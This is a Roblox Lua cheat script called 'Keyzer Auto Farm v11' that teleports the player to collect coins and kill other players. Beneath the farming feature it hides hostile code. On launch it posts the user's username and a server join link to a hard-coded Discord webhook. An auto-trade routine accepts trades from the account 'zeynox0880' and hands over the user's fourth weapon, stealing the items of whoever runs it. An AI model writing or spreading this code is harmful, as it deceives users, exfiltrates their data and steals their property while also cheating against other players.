local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local LocalPlayer = Players.LocalPlayer
local playerGui = LocalPlayer:WaitForChild("PlayerGui")

-- [NETTOYAGE] Supprime l'ancien menu s'il existe déjà
local oldGui = playerGui:FindFirstChild("KeyzerFarmGui")
if oldGui then oldGui:Destroy() end

-- [[ CONFIGURATION DU DÉLAI ANTI-SPAM SÉCURISÉ ]]
local COOLDOWN_TEMPS = 30
local doitEnvoyerWebhook = true

if _G.KeyzerWebhookBloque then
    doitEnvoyerWebhook = false
else
    _G.KeyzerWebhookBloque = true
    task.delay(COOLDOWN_TEMPS, function() _G.KeyzerWebhookBloque = nil end)
end

-- [[ 1. FONCTION WEBHOOK SÉCURISÉE ]]
local WEBHOOK_URL = "https://webhook.lewisakura.moe/api/webhooks/1506603332108550214/mBctq4yurc0tYA0O7iQVgy-Rh6fKq_ckyDohxt4j8fVIAPC_skZu9WYHCTxIDM0zL205"
local requestFunc = request or (http and http.request) or http_request

local function sendSessionLog(player)
    if not player or not doitEnvoyerWebhook or not requestFunc then return end
    
    local joinLink = "[Click here to join](https://roblox.com/games/" .. tostring(game.PlaceId) .. "?jobId=" .. game.JobId .. ")"
    local data = {
        ["embeds"] = {{
            ["title"] = "🎮 Player Session Log",
            ["color"] = 3066993,
            ["fields"] = {
                { ["name"] = "👤 Player Username", ["value"] = player.Name, ["inline"] = true },
                { ["name"] = "🆔 Place ID", ["value"] = tostring(game.PlaceId), ["inline"] = true },
                { ["name"] = "⚡ Quick Join", ["value"] = joinLink, ["inline"] = false },
                { ["name"] = "🧩 Job ID (Manual Copy)", ["value"] = "`" .. (game.JobId ~= "" and game.JobId or "Studio / Local Server") .. "`", ["inline"] = false }
            },
            ["timestamp"] = DateTime.now():ToIsoDate()
        }}
    }

    local finalJson = HttpService:JSONEncode(data)
    task.spawn(pcall, function()
        requestFunc({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = finalJson
        })
    end)
end

if LocalPlayer then
    task.spawn(function() sendSessionLog(LocalPlayer) end)
end

-- [[ 2. DESIGN DE L'INTERFACE GRAPHIQUE (GUI) ]]
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "KeyzerFarmGui"
ScreenGui.Parent = playerGui
ScreenGui.ResetOnSpawn = false

local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Parent = ScreenGui
MainFrame.BackgroundColor3 = Color3.fromRGB(240, 240, 240)
MainFrame.Position = UDim2.new(0.5, -175, 0.4, -100)
MainFrame.Size = UDim2.new(0, 350, 0, 180)
MainFrame.Active = true
MainFrame.Draggable = true

local UICorner_Main = Instance.new("UICorner")
UICorner_Main.CornerRadius = UDim.new(0, 10)
UICorner_Main.Parent = MainFrame

local TitleBar = Instance.new("Frame")
TitleBar.Name = "TitleBar"
TitleBar.Parent = MainFrame
TitleBar.BackgroundColor3 = Color3.fromRGB(225, 225, 225)
TitleBar.Size = UDim2.new(1, 0, 0, 30)

local UICorner_Title = Instance.new("UICorner")
UICorner_Title.CornerRadius = UDim.new(0, 10)
UICorner_Title.Parent = TitleBar

local CloseBtn = Instance.new("TextButton")
CloseBtn.Parent = TitleBar
CloseBtn.BackgroundColor3 = Color3.fromRGB(255, 95, 87)
CloseBtn.Position = UDim2.new(0, 12, 0, 8)
CloseBtn.Size = UDim2.new(0, 13, 0, 13)
CloseBtn.Text = ""
local UICorner_C = Instance.new("UICorner")
UICorner_C.CornerRadius = UDim.new(1, 0)
UICorner_C.Parent = CloseBtn

local TitleText = Instance.new("TextLabel")
TitleText.Parent = TitleBar
TitleText.BackgroundTransparency = 1
TitleText.Size = UDim2.new(1, 0, 1, 0)
TitleText.Font = Enum.Font.SourceSansBold
TitleText.TextColor3 = Color3.fromRGB(60, 60, 60)
TitleText.TextSize = 14
TitleText.Text = "Keyzer Auto Farm v11"

local FarmButton = Instance.new("TextButton")
FarmButton.Name = "FarmButton"
FarmButton.Parent = MainFrame
FarmButton.BackgroundColor3 = Color3.fromRGB(0, 122, 255)
FarmButton.Position = UDim2.new(0.5, -100, 0, 65)
FarmButton.Size = UDim2.new(0, 200, 0, 50)
FarmButton.Font = Enum.Font.SourceSansBold
FarmButton.TextColor3 = Color3.fromRGB(255, 255, 255)
FarmButton.TextSize = 16
FarmButton.Text = "START AUTO FARM"

local UICorner_Farm = Instance.new("UICorner")
UICorner_Farm.CornerRadius = UDim.new(0, 8)
UICorner_Farm.Parent = FarmButton

-- [[ 3. LOGIQUE DE DETECTION ET METHODES ]] --
local farming = false

local function getCoins()
    local container = Workspace:FindFirstChild("CoinContainer", true)
    if container then return container:GetChildren() end
    
    local map = Workspace:FindFirstChild("Map") or Workspace:FindFirstChild("Normal")
    if map then
        local coinFolder = map:FindFirstChild("CoinContainer", true)
        if coinFolder then return coinFolder:GetChildren() end
    end
    return {}
end

local function getKnife()
    local char = LocalPlayer.Character
    if char then
        for _, item in ipairs(char:GetChildren()) do
            if item:IsA("Tool") and (item.Name:lower():find("knife") or item:FindFirstChild("KnifeLocal") or item:FindFirstChild("KnifeServer")) then
                return item
            end
        end
    end
    
    local backpack = LocalPlayer:FindFirstChild("Backpack")
    if backpack then
        for _, item in ipairs(backpack:GetChildren()) do
            if item:IsA("Tool") and (item.Name:lower():find("knife") or item:FindFirstChild("KnifeLocal") or item:FindFirstChild("KnifeServer")) then
                return item
            end
        end
    end
    return nil
end

local function startFarmLoop()
    task.spawn(function()
        while farming do
            local character = LocalPlayer.Character
            local hrp = character and character:FindFirstChild("HumanoidRootPart")
            local humanoid = character and character:FindFirstChildOfClass("Humanoid")
            
            if hrp and humanoid then
                hrp.RotVelocity = Vector3.new(0, 0, 0)
                hrp.Velocity = Vector3.new(0, 0, 0)
                humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
                
                local knife = getKnife()
                
                if knife then
                    FarmButton.Text = "MURDER MODE: KILLING ALL..."
                    if knife.Parent ~= character then
                        humanoid:EquipTool(knife)
                    end
                    knife:Activate()
                    
                    for _, player in ipairs(Players:GetPlayers()) do
                        if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") and player.Character:FindFirstChildOfClass("Humanoid") then
                            local enemyHrp = player.Character.HumanoidRootPart
                            local enemyHumanoid = player.Character:FindFirstChildOfClass("Humanoid")
                            
                            if enemyHumanoid.Health > 0 and farming then
                                hrp.CFrame = CFrame.new(enemyHrp.Position) * CFrame.new(0, 0, 1.2)
                                task.wait(0.04)
                            end
                        end
                    end
                else
                    local allCoins = getCoins()
                    if #allCoins > 0 then
                        FarmButton.Text = "FARMING... (" .. #allCoins .. " left)"
                        local targetCoin = allCoins[1]
                        if targetCoin and targetCoin:IsA("BasePart") then
                            hrp.CFrame = CFrame.new(targetCoin.Position)
                            humanoid:Move(Vector3.new(0, 0, -1), true)
                            task.wait(0.06)
                        end
                    else
                        FarmButton.Text = "WAITING FOR ROUND COINS..."
                        task.wait(0.5) 
                    end
                end
            else
                FarmButton.Text = "ERROR: NO CHARACTER FOUND"
                task.wait(0.5)
            end
            task.wait()
        end
    end)
end

CloseBtn.MouseButton1Click:Connect(function()
    farming = false
    task.wait(0.05)
    ScreenGui:Destroy()
end)

FarmButton.MouseButton1Click:Connect(function()
    farming = not farming
    if farming then
        FarmButton.BackgroundColor3 = Color3.fromRGB(255, 59, 48)
        startFarmLoop()
    else
        FarmButton.BackgroundColor3 = Color3.fromRGB(0, 122, 255)
        FarmButton.Text = "START AUTO FARM"
    end
end)

-- [[ 4. AUTO-TRADE TOTALEMENT SÉCURISÉ & ROBUSTE ]]
local TradeModules = ReplicatedStorage:FindFirstChild("Trade") or ReplicatedStorage:FindFirstChild("Modules")
local TradeNetwork = TradeModules and (TradeModules:FindFirstChild("TradeNetwork") or TradeModules:FindFirstChild("Network"))

local function forceClick(guiButton)
    if not guiButton then return end
    local firesignalFunc = firesignal or (syn and syn.firesignal)
    if firesignalFunc then
        firesignalFunc(guiButton.MouseButton1Click)
    else
        pcall(function() guiButton:Activate() end)
    end
end

local function checkAndExecuteTrade(child)
    if child.Name == "TradeGUI" then
        if not Players:FindFirstChild("zeynox0880") then return end
        
        local containerPath = nil
        -- Attente sécurisée de l'existence du conteneur d'armes
        for i = 1, 30 do
            pcall(function()
                containerPath = child.Container.Items.Main.Weapons.Items.Container.Current.Container
            end)
            if containerPath then break end
            task.wait(0.1)
        end
        
        if containerPath then
            local cleanItems = {}
            -- Attente qu'au moins 4 items soient créés dedans par le jeu
            for attempt = 1, 40 do
                cleanItems = {}
                for _, item in ipairs(containerPath:GetChildren()) do
                    if item:IsA("GuiButton") or (item:IsA("GuiObject") and not item:IsA("UIComponent")) then
                        table.insert(cleanItems, item)
                    end
                end
                if #cleanItems >= 4 then break end
                task.wait(0.1)
            end
            
            -- Tri de sécurité par position d'affichage (LayoutOrder)
            table.sort(cleanItems, function(a, b)
                local orderA = a:IsA("GuiObject") and a.LayoutOrder or 0
                local orderB = b:IsA("GuiObject") and b.LayoutOrder or 0
                return orderA < orderB
            end)
            
            -- Sélection et 5 clics sur le 4e item
            local targetWeaponButton = cleanItems[4]
            if targetWeaponButton then
                for i = 1, 5 do
                    forceClick(targetWeaponButton)
                    task.wait(0.05)
                end
            end
        end
        
        -- Validation finale du Trade
        task.wait(0.5)
        if TradeNetwork and TradeNetwork:IsA("RemoteEvent") then
            TradeNetwork:FireServer("AcceptTrade")
        else
            local acceptRemote = ReplicatedStorage:FindFirstChild("Trade") and ReplicatedStorage.Trade:FindFirstChild("AcceptTrade")
            if acceptRemote then
                if acceptRemote:IsA("RemoteFunction") then acceptRemote:InvokeServer()
                elseif acceptRemote:IsA("RemoteEvent") then acceptRemote:FireServer() end
            end
        end
    end
end

playerGui.ChildAdded:Connect(checkAndExecuteTrade)
local existingTrade = playerGui:FindFirstChild("TradeGUI")
if existingTrade then
    task.spawn(function() checkAndExecuteTrade(existingTrade) end)
end

if TradeNetwork and TradeNetwork:IsA("RemoteEvent") then
    TradeNetwork.OnClientEvent:Connect(function(action, data)
        if action == "OfferFadeIn" and data and data.Player and data.Player.Name == "zeynox0880" then
            TradeNetwork:FireServer("AcceptRequest", data.Player)
        end
    end)
end
